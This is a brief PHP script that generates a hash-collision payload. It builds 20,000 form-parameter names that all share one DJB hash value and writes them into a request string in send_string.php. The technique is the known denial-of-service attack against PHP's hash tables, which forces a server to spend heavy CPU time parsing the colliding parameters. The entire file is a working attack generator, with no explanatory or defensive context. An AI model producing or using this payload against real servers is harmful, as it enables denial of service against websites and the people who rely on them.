<?php
require 'functions.php';
$duplicates = array(
  'Ez', 'FY',
);
$possibleKeys = loopDuplicates($duplicates, 15);
$keys = $possibleKeys;

$workingkeys = array();
$e=0;
$validKey = djb($keys[0]);
foreach($keys as $key) {
  if ($validKey == djb($key)) {
    $workingkeys[] = $key;
  } else {
    $e++;
  }
  echo "$key => ".djb($key)."\n";

}

echo "found ".count($workingkeys)." working keys; while {$e} didnt work alright..\n";
$str = "<?php \$sendString = \n";
$i = 0;
for($i=0; $i < 20000;$i++)
{
  $str .= "'".$workingkeys[$i]."=1&'.\n";
}
$str .="'';\n";
file_put_contents('send_string.php',$str);
echo "done\n";
